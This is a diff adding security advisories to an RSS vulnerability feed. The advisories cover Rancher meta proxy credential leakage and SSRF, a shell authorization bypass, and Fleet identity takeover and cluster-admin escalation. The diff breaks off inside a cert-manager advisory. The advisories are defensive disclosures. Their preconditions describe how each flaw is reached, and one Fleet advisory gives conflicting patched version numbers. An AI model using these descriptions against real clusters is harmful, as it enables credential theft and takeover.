@@ -7,7 +7,790 @@
     <atom:link href="https://tuxpeople.github.io/forked-vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Thu, 29 Oct 2026 10:46:58 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 30 Oct 2026 10:46:28 +0000</lastBuildDate>
+    <item>
+      <title>[HIGH] rancher/rancher — Rancher credentials disclosed to third-party hosts by the Rancher Manager meta proxy (CVE-2026-88811)</title>
+      <link>https://github.com/rancher/rancher/security/advisories/GHSA-x82x-2qj6-5rm2</link>
+      <description>CVE-2026-88811 · CVSS 8.8 (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N) · CWE-200, CWE-201
+
+Affected:
+- go/github.com/rancher/rancher &gt;=2.15.0, &lt;2.15.3 (patched: 2.15.3)
+- go/github.com/rancher/rancher &gt;=2.14.0, &lt;2.14.7 (patched: 2.14.7)
+- go/github.com/rancher/rancher &gt;=2.13.0, &lt;2.13.11 (patched: 2.13.11)
+- go/github.com/rancher/rancher &gt;=2.12.0, &lt;2.12.15 (patched: 2.12.15)
+- go/github.com/rancher/rancher &gt;=2.11.0, &lt;2.11.19 (patched: 2.11.19)
+
+---
+
+### Impact&#13;
+&#13;
+A security vulnerability exists in the Rancher Manager meta proxy, the component&#13;
+that the Rancher UI uses to query cloud provider APIs on behalf of a user, for&#13;
+example when listing regions, sizes, or images for a cloud credential during&#13;
+cluster or node provisioning.&#13;
+&#13;
+When the proxy forwards a request to a configured third-party host, it did not&#13;
+consistently remove the caller's own Rancher credentials from the outgoing&#13;
+request. As a result, Rancher credentials belonging to the caller could be&#13;
+transmitted to the third-party host together with the request:&#13;
+&#13;
+- The browser session credential of the signed-in Rancher user could be sent to&#13;
+  the cloud provider during ordinary use of the Rancher UI, whenever a&#13;
+  provisioning view performs a lookup backed by a cloud credential.&#13;
+- A Rancher API token used by a non-browser API client could be sent to the&#13;
+  third-party host when that client calls the proxy without the headers the&#13;
+  proxy expects for credential selection.&#13;
+&#13;
+Any party able to operate or observe the receiving host — including its request&#13;
+logs and any TLS-terminating intermediary in front of it — therefore receives a&#13;
+live Rancher credential carrying the permissions of the affected user, which may&#13;
+include administrative access to the Rancher Manager control plane and to the&#13;
+clusters it manages. Rancher API tokens may be long-lived, extending the window&#13;
+of exposure.&#13;
+&#13;
+The set of hosts that can receive a forwarded request is limited to the&#13;
+installation's allow-list: the `whitelist-domain` setting, the domains listed by&#13;
+cluster and node drivers, and, in Rancher 2.14 and later, `ProxyEndpoint`&#13;
+resources. By default this is `forums.rancher.com` and the public API endpoints&#13;
+of the built-in cloud providers. The list grows with any custom cluster or node&#13;
+driver and any additional proxy endpoint configured by an administrator.&#13;
+&#13;
+#### Preconditions&#13;
+&#13;
+- For the session credential exposure: a signed-in user opens a Rancher UI view&#13;
+  that looks up cloud provider data through the proxy, such as the Amazon EC2,&#13;
+  DigitalOcean, Linode or phoenixNAP provisioning forms, or uses a UI extension&#13;
+  that calls the proxy with a credential signer. No deliberate action beyond&#13;
+  normal navigation is required, and no attacker activity against Rancher is&#13;
+  required for the credential to leave the installation.&#13;
+- For the API token exposure: a non-browser client authenticates to Rancher with&#13;
+  an API token and calls the meta proxy without supplying the proxy's credential&#13;
+  selection headers. The Rancher UI does not follow this pattern.&#13;
+&#13;
+&gt; [!NOTE]&#13;
+&gt; Deployments in a default configuration are affected as soon as a user opens one&#13;
+&gt; of these provisioning forms; no non-default feature needs to be enabled.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The fix makes the meta proxy strip the caller's Rancher credentials from every&#13;
+outgoing request before it is sent to the third-party host, on all request&#13;
+paths:&#13;
+&#13;
+- The `Authorization` and `Cookie` request headers are no longer copied from the&#13;
+  inbound request to the outgoing request. The paths that legitimately need an&#13;
+  outgoing `Authorization` header — the explicit auth header, and the cloud&#13;
+  credential signers — continue to set it themselves after the copy, so the&#13;
+  behavior of supported flows is unchanged.&#13;
+- Cookie replacement now runs before any authentication handling rather than&#13;
+  after it, so it applies to every request, including those that select a cloud&#13;
+  credential signer. A client that supplies its own cookie value through the&#13;
+  proxy's dedicated cookie header now has that value forwarded on all paths,&#13;
+  including signer paths, where it was previously not applied.&#13;
+&#13;
+A client that calls the proxy without supplying either credential selection&#13;
+header now reaches the third-party host without an `Authorization` header and&#13;
+receives that host's own authentication error instead of having a Rancher&#13;
+credential forwarded. A client that relied on its own `Authorization` header&#13;
+being passed through to the third-party host must send that value in&#13;
+`X-API-Auth-Header` instead; the Rancher UI already does. Apart from this&#13;
+change, the fix is not a breaking change and requires no user action beyond&#13;
+upgrading.&#13;
+&#13;
+Patched versions of Rancher include releases v2.15.3, v2.14.7, v2.13.11,&#13;
+v2.12.15, and v2.11.19.&#13;
+&#13;
+Because the exposure occurs silently during normal operation, administrators&#13;
+should treat Rancher credentials that may have been forwarded as potentially&#13;
+compromised after upgrading: rotate or delete long-lived Rancher API tokens that&#13;
+have been used against the meta proxy, and invalidate existing user sessions so&#13;
+that affected users sign in again.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+There is no complete workaround other than upgrading to a patched version.&#13;
+Installations that cannot upgrade immediately can reduce exposure by:&#13;
+&#13;
+- Reviewing the hosts the proxy is allowed to contact and removing any entry&#13;
+  that is not strictly required: entries in the `whitelist-domain` setting, the&#13;
+  whitelist domains of custom cluster and node drivers, and, in Rancher 2.14 and&#13;
+  later, custom `ProxyEndpoint` resources. The hosts of built-in drivers are&#13;
+  restored when Rancher starts and cannot be removed this way.&#13;
+- Creating cloud credentials, node templates and machine configurations through&#13;
+  the API or `kubectl` instead of the Rancher UI provisioning forms for Amazon&#13;
+  EC2, DigitalOcean, Linode and phoenixNAP, which look up cloud provider data&#13;
+  through the proxy.&#13;
+- Making sure API clients do not call the meta proxy with a Rancher API token&#13;
+  unless the request also sets `X-API-Auth-Header`.&#13;
+- Lowering `auth-user-session-ttl-minutes` and `auth-token-max-ttl-minutes`, and&#13;
+  avoiding long-lived API tokens with administrative permissions for workflows&#13;
+  that reach the meta proxy, so that an exposed credential is valid for a&#13;
+  shorter period.&#13;
+&#13;
+### References&#13;
+&#13;
+- [rancher/rancher#58223](https://github.com/rancher/rancher/pull/58223) — Fix meta proxy header handling&#13;
+- [rancher/rancher#58224](https://github.com/rancher/rancher/pull/58224) — v2.15 backport&#13;
+- [rancher/rancher#58225](https://github.com/rancher/rancher/pull/58225) — v2.14 backport&#13;
+- [rancher/rancher#58226](https://github.com/rancher/rancher/pull/58226) — v2.13 backport&#13;
+- [rancher/rancher#58227](https://github.com/rancher/rancher/pull/58227) — v2.12 backport&#13;
+- [rancher/rancher#58229](https://github.com/rancher/rancher/pull/58229) — v2.11 backport&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
+- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
+- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).</description>
+      <guid isPermaLink="false">GHSA-x82x-2qj6-5rm2</guid>
+      <category>HIGH</category>
+      <category>rancher/rancher</category>
+      <pubDate>Thu, 29 Oct 2026 17:26:42 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] rancher/rancher — Rancher meta proxy allowlist bypass leading to server-side request forgery (CVE-2026-88809)</title>
+      <link>https://github.com/rancher/rancher/security/advisories/GHSA-f9gf-wh3x-jx3v</link>
+      <description>CVE-2026-88809 · CVSS 7.1 (CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N) · CWE-636, CWE-918
+
+Affected:
+- go/github.com/rancher/rancher &gt;=2.15.0, &lt;2.15.3 (patched: 2.15.3)
+- go/github.com/rancher/rancher &gt;=2.14.0, &lt;2.14.7 (patched: 2.14.7)
+- go/github.com/rancher/rancher &gt;=2.13.0, &lt;2.13.11 (patched: 2.13.11)
+- go/github.com/rancher/rancher &gt;=2.12.0, &lt;2.12.15 (patched: 2.12.15)
+- go/github.com/rancher/rancher &gt;=2.11.0, &lt;2.11.19 (patched: 2.11.19)
+
+---
+
+### Impact&#13;
+&#13;
+A security vulnerability exists in the Rancher Manager meta proxy endpoint&#13;
+(`/meta/proxy`). This endpoint is intended to forward requests only to&#13;
+destinations that appear on a configured allowlist. The allowlist decision was&#13;
+evaluated in a place where it could not stop a request from being forwarded, so&#13;
+a rejected destination was logged but the request was still handed to the&#13;
+proxy's transport.&#13;
+&#13;
+As a result, an authenticated Rancher user could cause the Rancher server to&#13;
+send requests to hosts that the allowlist is meant to block, including internal&#13;
+services that are reachable from the Rancher server but not from the user. The&#13;
+user chooses the request method, headers, body and query string, and the&#13;
+response is returned to the user.&#13;
+&#13;
+The practical consequences are disclosure of data from internal systems and the&#13;
+ability to send requests to internal systems from the Rancher server's network&#13;
+position. In some environments this includes the cloud instance metadata&#13;
+endpoint, for example on AWS when IMDSv1 is enabled, which can expose cloud&#13;
+provider credentials.&#13;
+&#13;
+#### Preconditions&#13;
+&#13;
+- The attacker must be an authenticated Rancher user. No administrative&#13;
+  privileges on the local cluster are required.&#13;
+- The attacker's request must reach the Rancher server as an HTTP/1.1 request&#13;
+  that carries the full destination URL in the request line, with no HTTP-aware&#13;
+  proxy in between that rewrites it. HTTP/2 requests cannot carry this form.&#13;
+  The proxies tested in front of Rancher (nginx, Traefik, Envoy and HAProxy)&#13;
+  rewrite or reject such requests, so traffic through the `Ingress` created by&#13;
+  the default Helm installation is blocked when one of these controllers serves&#13;
+  it. Several supported configurations leave a direct path open: access to the&#13;
+  Rancher Service from a pod in the local cluster, `networkExposure.type: none`&#13;
+  with a layer 4 load balancer, TLS passthrough via `tls: external`, and&#13;
+  `hostPort` or `hostNetwork` exposure.&#13;
+&#13;
+&gt; [!NOTE]&#13;
+&gt; An ingress controller in front of Rancher narrows who can reach the vulnerable&#13;
+&gt; endpoint, but pods in the local cluster can reach the Rancher Service directly&#13;
+&gt; on every installation, so it should not be relied upon as a mitigating control.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The fix moves the destination allowlist check into the request handler that&#13;
+wraps the reverse proxy, so that a request to a destination that is not on the&#13;
+allowlist is rejected before any connection is made and the client receives an&#13;
+error response instead of proxied content.&#13;
+&#13;
+The change is server-side only. Requests to allowlisted destinations continue to&#13;
+be proxied as before, so no user action beyond upgrading is required. There are&#13;
+no breaking changes.&#13;
+&#13;
+Patched versions of Rancher include releases v2.15.3, v2.14.7, v2.13.11,&#13;
+v2.12.15, and v2.11.19.&#13;
+&#13;
+Administrators who suspect their installation was targeted before upgrading&#13;
+should rotate any credentials reachable from the Rancher server's network&#13;
+position, including cloud provider credentials available through instance&#13;
+metadata where the metadata endpoint accepts such requests. Rancher server logs&#13;
+record a `Failed to proxy:` line for each attempt, but normal rejected requests&#13;
+log the same line, so the logs alone do not show whether a request was&#13;
+forwarded.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+No workaround fully addresses the issue other than upgrading to a patched&#13;
+version. Users who cannot upgrade immediately can reduce exposure by:&#13;
+&#13;
+- Ensuring that all network paths to the Rancher server go through an&#13;
+  HTTP-aware reverse proxy or ingress controller, rather than a layer 4 load&#13;
+  balancer, TLS passthrough, or direct Service, `hostPort`, or `hostNetwork`&#13;
+  access.&#13;
+- Applying NetworkPolicy rules in the local cluster so that workload pods&#13;
+  cannot connect directly to the Rancher Service ports, while still allowing&#13;
+  traffic from the ingress controller and any other component that must reach&#13;
+  Rancher directly.&#13;
+- Restricting the Rancher server's own egress with network policies or security&#13;
+  groups so that it cannot reach internal services or the cloud instance&#13;
+  metadata endpoint.&#13;
+&#13;
+### References&#13;
+&#13;
+- [rancher/rancher#58241](https://github.com/rancher/rancher/pull/58241) — Fix meta proxy error handling&#13;
+- [rancher/rancher#58242](https://github.com/rancher/rancher/pull/58242) — v2.15 backport&#13;
+- [rancher/rancher#58243](https://github.com/rancher/rancher/pull/58243) — v2.14 backport&#13;
+- [rancher/rancher#58244](https://github.com/rancher/rancher/pull/58244) — v2.13 backport&#13;
+- [rancher/rancher#58245](https://github.com/rancher/rancher/pull/58245) — v2.12 backport&#13;
+- [rancher/rancher#58246](https://github.com/rancher/rancher/pull/58246) — v2.11 backport&#13;
+&#13;
+### Credits&#13;
+&#13;
+This vulnerability was discovered and reported by 김도현 ([D0HY30N](https://github.com/D0HY30N)).&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
+- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
+- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).</description>
+      <guid isPermaLink="false">GHSA-f9gf-wh3x-jx3v</guid>
+      <category>HIGH</category>
+      <category>rancher/rancher</category>
+      <pubDate>Thu, 29 Oct 2026 17:26:38 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] rancher/rancher — Authorization bypass on the local cluster shell endpoint allows an unauthorized Rancher user to obtain a shell pod on the management cluster (CVE-2026-104623)</title>
+      <link>https://github.com/rancher/rancher/security/advisories/GHSA-8x6f-2v58-x6p7</link>
+      <description>CVE-2026-104623 · CVSS 5.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L) · CWE-862, CWE-863
+
+Affected:
+- go/ github.com/rancher/rancher &gt;=2.15.0, &lt;2.15.3 (patched: 2.15.3)
+- go/ github.com/rancher/rancher &gt;=2.14.0, &lt;2.14.7 (patched: 2.14.7)
+- go/ github.com/rancher/rancher &gt;=2.13.0, &lt;2.13.11 (patched: 2.13.11)
+- go/ github.com/rancher/rancher &gt;=2.12.0, &lt;2.12.15 (patched: 2.12.15)
+- go/ github.com/rancher/rancher &gt;=2.11.0, &lt;2.11.19 (patched: 2.11.19)
+
+---
+
+### Impact&#13;
+&#13;
+A security vulnerability exists in Rancher Manager's authorization handling for the local (management) cluster shell feature. The authorization check that was introduced to protect this feature was not applied to every API route that can reach it, so an alternative request form reached the shell handler without the access check being evaluated.&#13;
+&#13;
+As a result, any authenticated Rancher user — including a user holding only the default `user` global role and no role bindings on the `local` cluster — could obtain an interactive shell pod on the management cluster in the `cattle-system` namespace. The spawned shell runs as an unprivileged pod and its Kubernetes API access remains scoped to the requesting user's own identity, so it does not by itself grant additional Kubernetes permissions. It does, however, break the expected isolation of the management cluster by granting the user compute resources and an in-namespace network position on the management plane that they were not authorized to have.&#13;
+&#13;
+This is a bypass of the protection added for&#13;
+[CVE-2022-21953](https://github.com/rancher/rancher/security/advisories/GHSA-g25r-gvq3-wrq7).&#13;
+&#13;
+#### Preconditions&#13;
+&#13;
+- The attacker requires an authenticated Rancher account. No permissions on the `local` cluster and no administrative privileges are required.&#13;
+- Deployments in a default configuration are affected. No non-default feature flag or setting needs to be enabled.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The fix ensures that the authorization check for the local cluster shell is evaluated consistently for all API request forms that can reach the shell handler, rather than only for a single route form. The shell handler no longer relies solely on an outer authorization gate, so requests from users without the required access to the `local` cluster are rejected.&#13;
+&#13;
+The change is server-side only. Legitimate shell access for administrators and for users who are authorized on the `local` cluster is unaffected, and no user action beyond upgrading is required. This is not a breaking change.&#13;
+&#13;
+Patched versions of Rancher include releases `v2.15.3`, `v2.14.7`, `v2.13.11`,`v2.12.15` and `v2.11.19`.&#13;
+&#13;
+Administrators who suspect their installation was targeted before upgrading should review the `cattle-system` namespace on the `local` cluster for unexpected `dashboard-shell-*` pods and remove any that are not accounted for, and review Rancher audit logs for unexpected shell requests.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+No workaround fully addresses the issue other than upgrading to a patched version. Users who cannot upgrade immediately can reduce exposure by:&#13;
+&#13;
+- Restricting the set of users who hold Rancher accounts and reviewing existing accounts, since any authenticated account is sufficient to be affected.&#13;
+- Placing Rancher behind a reverse proxy, ingress policy or WAF that rejects requests to the `local` cluster shell endpoints for all clients except the trusted administrative networks that legitimately require shell access.&#13;
+- Monitoring the `cattle-system` namespace on the `local` cluster for unexpected `dashboard-shell-*` pods and alerting on their creation.&#13;
+&#13;
+### References&#13;
+&#13;
+- [CVE-2022-21953](https://github.com/rancher/rancher/security/advisories/GHSA-g25r-gvq3-wrq7)&#13;
+&#13;
+### Credits&#13;
+&#13;
+This vulnerability was found and reported by Kenzie Cuttler (@K-Cuttler) and Arpit Jain (@arpitjain099)&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
+- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
+- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).&#13;
+</description>
+      <guid isPermaLink="false">GHSA-8x6f-2v58-x6p7</guid>
+      <category>MEDIUM</category>
+      <category>rancher/rancher</category>
+      <pubDate>Thu, 29 Oct 2026 17:26:30 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] rancher/fleet — Cluster identity takeover in Fleet cluster registration allows access to another cluster's Fleet namespace (CVE-2026-104615)</title>
+      <link>https://github.com/rancher/fleet/security/advisories/GHSA-gx8v-2929-9q95</link>
+      <description>CVE-2026-104615 · CVSS 7.3 (CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:L/VA:H/SC:H/SI:L/SA:H) · CWE-290, CWE-639, CWE-863
+
+Affected:
+- go/ github.com/rancher/fleet &gt;=v0.16.0, &lt;0.16.3 (patched: 0.16.3)
+- go/ github.com/rancher/fleet &gt;=v0.15.0, &lt;0.15.17 (patched: 0.15.17)
+- go/ github.com/rancher/fleet &gt;=v0.14.0, &lt;0.14.12 (patched: 0.14.12)
+- go/ github.com/rancher/fleet &gt;=v0.13.0, &lt;0.13.17 (patched: 0.13.17)
+- go/ github.com/rancher/fleet &gt;=v0.12.0
+
+---
+
+### Impact&#13;
+&#13;
+A security vulnerability was discovered in Fleet's cluster registration flow. The cluster identity claimed by a registration request was accepted without being bound to the registration token that the request was made with. As a result, a registration request could be associated with a managed cluster that was originally registered with a different registration token.&#13;
+&#13;
+An actor holding a valid registration token for a Fleet workspace, and knowing the client identifier of another cluster registered in that same workspace, could obtain credentials scoped to that other cluster's Fleet management namespace. This allows disclosure of Secrets and ConfigMaps synced into that namespace, limited modification of bundle deployment and cluster status information, and disruption of Fleet management of the affected cluster, because the legitimate agent's registration and credentials are replaced.&#13;
+&#13;
+Confidentiality impact is highest where the affected cluster's Fleet namespace holds credential material delivered through Fleet. Deployment content itself cannot be modified through this vulnerability.&#13;
+&#13;
+#### Preconditions&#13;
+&#13;
+Exploitation of this security vulnerability requires the following conditions:&#13;
+&#13;
+- The actor must hold a valid Fleet registration token for the workspace in which the target cluster is registered.&#13;
+- The actor must know the target cluster's client identifier, which is a stable, non-secret value.&#13;
+- Cross-tenant impact additionally requires a shared Fleet workspace in which clusters belonging to different tenants are registered, which is the default single-workspace model.&#13;
+&#13;
+### Patches&#13;
+&#13;
+The fix binds a cluster to the registration token it was registered with. Fleet records the registration token name on the `Cluster` resource in the `fleet.cattle.io/registered-token` annotation: for new clusters at creation time, and for existing clusters on their first grant after upgrade. A registration request that claims an existing cluster identity using a different registration token is no longer granted, and Fleet emits a `RegistrationTokenMismatch` warning event on the cluster naming the annotation value required to rebind it. Access to the registration credential secret is likewise limited to the cluster's bound token. Clusters that use a `kubeConfigSecret` use their import token and ignore any registration-token annotation left over from an earlier agent-initiated registration.&#13;
+&#13;
+The binding is per registration token. Clusters registered with the same registration token are not distinguished from each other, so a registration token should not be shared across tenants or trust boundaries.&#13;
+&#13;
+Operational notes for upgrades:&#13;
+&#13;
+- Re-registration with the same registration token name, and clusters whose agents are deployed by Fleet, are unaffected.&#13;
+- Deliberately re-registering a cluster with a different registration token now requires an explicit action: set the `fleet.cattle.io/registered-token` annotation on the `Cluster` to the new token name, which also re-enqueues pending registration requests. The Fleet Helm value `allowClusterRegistrationTokenChange: true` is available as an opt-out.&#13;
+- If the registration token named by a request does not exist, the request remains pending and resumes once the token exists; existing registrations are retained.&#13;
+&#13;
+Patched versions of Fleet include releases `v0.16.3`, `v0.15.8`, `v0.14.12`, and `v0.13.17`.&#13;
+&#13;
+Patched versions of Rancher include releases `v2.15.3`, `v2.14.7`, `v2.13.11`, and `v2.12.15`.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+No workaround exists other than upgrading to a patched version. Organizations unable to upgrade immediately can reduce exposure by:&#13;
+&#13;
+- Issuing a separate Fleet workspace, and therefore separate registration tokens, per tenant or per trust boundary, instead of registering clusters of different tenants into a shared workspace.&#13;
+- Treating `ClusterRegistrationToken` resources as sensitive credentials: restricting, through RBAC, who may read or create them, and keeping their TTL short so that tokens are not valid beyond the registration window.&#13;
+- Restricting read access to `Cluster` resources in Fleet workspaces, so that cluster client identifiers are not broadly readable.&#13;
+- Monitoring Fleet workspaces for unexpected `ClusterRegistration` objects and for managed clusters whose agent unexpectedly loses its credentials or stops reporting.&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
+- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
+- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).&#13;
+</description>
+      <guid isPermaLink="false">GHSA-gx8v-2929-9q95</guid>
+      <category>HIGH</category>
+      <category>rancher/fleet</category>
+      <pubDate>Thu, 29 Oct 2026 17:26:13 +0000</pubDate>
+    </item>
+    <item>
+      <title>[CRITICAL] rancher/fleet — Privilege escalation to cluster-admin on the Rancher local cluster through Fleet's agent management controller (CVE-2026-94290)</title>
+      <link>https://github.com/rancher/fleet/security/advisories/GHSA-qfmw-gw96-ffcr</link>
+      <description>CVE-2026-94290 · CVSS 9.4 (CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H) · CWE-269, CWE-441, CWE-863
+
+Affected:
+- go/ github.com/rancher/fleet &gt;=0.16.0, &lt;0.16.3 (patched: 0.16.3)
+- go/ github.com/rancher/fleet &gt;=0.15.0, &lt;0.15.8 (patched: 0.15.8)
+- go/ github.com/rancher/fleet &gt;=0.14.0, &lt;0.14.12 (patched: 0.14.12)
+- go/ github.com/rancher/fleet &gt;=v0.13.0, &lt;0.13.17 (patched: 0.13.17)
+
+---
+
+### Impact&#13;
+&#13;
+A privilege escalation issue was found in Fleet's agent management ("import") controller, which runs on the Rancher management (`local`) cluster with cluster-administrator privileges.&#13;
+&#13;
+Fleet clusters reference a kubeconfig secret that the controller uses to install and manage a Fleet agent on the target cluster. The controller did not sufficiently restrict which kubeconfig secrets a Fleet `Cluster` object was allowed to reference. As a result, a Fleet cluster defined in a namespace an ordinary user controls could be associated with administrative credentials for the management cluster itself, causing the controller to manage the management cluster on that user's behalf and to run that user's Fleet content there with elevated privileges.&#13;
+&#13;
+The practical impact is that an authenticated Rancher user holding only the default `user` global role, with no role bindings at all on the `local` cluster, could obtain full cluster-admin on the Rancher management cluster. That level of access exposes all secrets stored on the management cluster, including credentials for downstream clusters and API tokens, allows arbitrary changes to RBAC and to any resource, and allows disruption of the Rancher management server itself. Because downstream cluster credentials are stored on the management cluster, the impact extends to every cluster managed by the affected Rancher installation.&#13;
+&#13;
+**Note:** Fleet is enabled by default in Rancher, and the self-service creation of Fleet workspaces by ordinary users is intentional, documented behavior. No non-default feature or configuration had to be enabled for an installation to be affected. Installations that had already restricted Fleet workspace self-service through custom global roles reduced their exposure, but this was not the default configuration.&#13;
+&#13;
+### Patches&#13;
+&#13;
+Fleet's agent management controller no longer trusts a kubeconfig secret based on the namespace it resides in. A Fleet `Cluster` may reference a kubeconfig secret in another namespace only when that secret carries the label `fleet.cattle.io/kubeconfig-referenceable-from` with the `Cluster`'s namespace as its value. Only users allowed to modify secrets in the secret's namespace can set this label, so the owner of a credential decides which namespace may use it. References to a kubeconfig secret in the `Cluster`'s own namespace are unchanged. Independently of the label, Fleet now only deploys an agent onto the management cluster for `Cluster` objects in Fleet's own bootstrap and system namespaces. A rejected reference is reported in the `Imported` condition of the `Cluster`.&#13;
+&#13;
+Rancher keeps the kubeconfig secret of a cluster assigned to a Fleet workspace other than `fleet-default` in the `fleet-default` namespace. Patched Rancher versions add and maintain the `fleet.cattle.io/kubeconfig-referenceable-from` label on such secrets automatically, so these clusters keep working with the patched Fleet versions. The security fix itself is in Fleet; the Rancher change is required for compatibility, so Rancher and its bundled Fleet should be upgraded together.&#13;
+&#13;
+**Upgrade action:** After upgrading, a Fleet `Cluster` that references a kubeconfig secret in a different namespace, for example a cluster registered manually with `kubeConfigSecretNamespace`, is no longer imported until that secret is labeled `fleet.cattle.io/kubeconfig-referenceable-from=&lt;Cluster namespace&gt;`. Administrators who maintain such secrets themselves must add the label. Agents that were already deployed are left in place. As a temporary compatibility measure, the Fleet Helm value `allowUnlabeledKubeConfigSecretNamespaces: true` accepts unlabeled secrets in Fleet's well-known namespaces (`fleet-local`, `fleet-default`, and the Fleet system namespaces) as in earlier releases. Enabling it weakens the protection described above, so it should only be used until the affected secrets are labeled.&#13;
+&#13;
+Patched versions of Fleet include releases `v0.16.3`, `v0.15.8`, `v0.14.12`, and `v0.13.17`.&#13;
+&#13;
+Patched versions of Rancher include releases `v2.15.3`, `v2.14.7`, `v2.13.11`, and `v2.12.15`.&#13;
+&#13;
+### Workarounds&#13;
+&#13;
+There is no Fleet-side configuration option that fully prevents this issue on affected versions; upgrading to a patched version is strongly recommended. For users who cannot upgrade immediately, the following operational mitigations reduce exposure:&#13;
+&#13;
+1. **Remove Fleet workspace self-service from ordinary users.** Create a custom global role, or amend the global roles bound to standard users, so that the `create` verb on `management.cattle.io` `fleetworkspaces` is not granted by default. This removes an intentional self-service capability and should be validated against your tenancy model before being applied.&#13;
+&#13;
+2. **Restrict who may create Fleet cluster objects.** Review role bindings that grant write access to `fleet.cattle.io` `clusters` and `bundles` in non-system namespaces, and limit them to administrators and trusted operators.&#13;
+&#13;
+3. **Reject tenant-owned Fleet clusters that reference kubeconfig secrets in other namespaces.** Where an admission or policy controller (for example Kubewarden or another validating admission policy engine) is available on the management cluster, deny creation and update of `fleet.cattle.io` `Cluster` resources outside Fleet's own system-managed namespaces when `kubeConfigSecretNamespace` names a namespace other than the `Cluster`'s own. Clusters that Rancher assigned to a Fleet workspace other than `fleet-default` legitimately reference their kubeconfig secret in `fleet-default` and must be allowed explicitly.&#13;
+&#13;
+4. **Monitor for unexpected agent installations and RBAC changes.** Alert on the creation of new Fleet agent namespaces and deployments on the `local` cluster, and on new `ClusterRoleBinding` objects granting `cluster-admin`, since these are observable signs of the underlying weakness being abused.&#13;
+&#13;
+### Credits&#13;
+&#13;
+This issue was reported by Kenzie Cuttler (@K-Cuttler) as part of Tulip Interfaces, Inc. Security Research.&#13;
+&#13;
+### For more information&#13;
+&#13;
+If you have any questions or comments about this advisory:&#13;
+&#13;
+- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.&#13;
+- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.&#13;
+- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).&#13;
+</description>
+      <guid isPermaLink="false">GHSA-qfmw-gw96-ffcr</guid>
+      <category>CRITICAL</category>
+      <category>rancher/fleet</category>
+      <pubDate>Thu, 29 Oct 2026 17:26:09 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] go:github.com/cert-manager/cert-manager — cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials (CVE-2026-62290)</title>
+      <link>https://github.com/advisories/GHSA-8rvj-mm4h-c258</link>
+      <description>CVE-2026-62290 · CVSS 7.3 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N) · CWE-863
+
+Affected:
+- go/github.com/cert-manager/cert-manager &gt;= 1.18.0, &lt; 1.19.6 (patched: 1.19.6)
+- go/github.com/cert-manager/cert-manager &gt;= 1.20.0-alpha.0, &lt; 1.20.3 (patched: 1.20.3)
+
+---
+
+## Summary
+
+`Challenge` resources under `acme.cert-manager.io` can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an `Order`, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses `Challenge.spec.solver` as the DNS01 provider configuration.
+
+When the direct Challenge references a `ClusterIssuer`, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the `ClusterIssuer` reference, but the DNS provider configuration itself is attacker-controlled through `Challenge.spec.solver`. This lets a namespace user bypass `Issuer`/`ClusterIssuer` solver selectors such as `dnsZones`, `dnsNames`, and `matchLabels`, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.
+
